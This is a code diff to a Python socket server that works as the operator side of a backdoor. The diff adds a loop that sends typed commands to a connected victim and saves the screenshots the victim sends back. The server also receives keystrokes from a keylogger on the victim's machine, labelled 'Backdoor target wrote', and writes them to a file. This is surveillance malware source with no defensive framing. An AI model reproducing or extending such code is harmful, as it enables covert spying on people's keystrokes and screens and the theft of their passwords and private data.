@@ -1,18 +1,49 @@
 import socket
 import sys
 import threading
+import os
+
+def receive_prt_sc(client, n):
+    screenshot = 'screenshot-' + str(n) + ".jpg"  
+    with open(screenshot, 'wb') as file:
+        while True:
+            data = client.recv(1024)
+            print('recebi ', data)
+            if not data:
+                break
+            if b'END_FILE' in data:
+                break
+            file.write(data)
+
 
 def handle_print_screen(client):
-    print('handle with print screen')
+    n = 0
+    while True:
+        while True:
+            print('digite seu comando')
+            request = input()
+            print('vou enviar ', request)
+            client.send(request.encode('utf-8'))
+            if request == 'PRINT':
+                receive_prt_sc(client, n)
+                n += 1
+            elif request == 'EXIT':
+                break
 
+        # CLOSE CONNECTION WITH CLIENT
+        os.system("rm img.jpg")
+        client.close()
+        
 def handle_keylogger(client):
     while True:
-        print("[+] Receiving the keylogger from client each 10 seconds. You only can see the backdoor when the connection is down :( ")
+        print("[+] Receiving the keylogger from client each 10 seconds")
         with open('keylogger.txt', 'wb') as arquivo:
             while True:
                 data = client.recv(1024)  
+                # CONNECTION IS OVER
                 if not data:
                     break
+                # PRINT ONLY IF THERE IS MESSAGE
                 if data != '':
                     print("[+] Backdoor target wrote:\n→ ", data.decode('utf-8'))
                 arquivo.write(data)
@@ -25,10 +56,10 @@ def handle_keylogger(client):
 
 def handle_clients(client, id):
     # FIRST TO CONNECT: KEYLOGGER
-    KEYLOGGER = 0
+    KEYLOGGER = 1
     
     # SECOND TO CONNECT: PRINTSCREEN
-    PRINTSCREEN = 1
+    PRINTSCREEN = 0
 
     if id == KEYLOGGER:
         handle_keylogger(client)
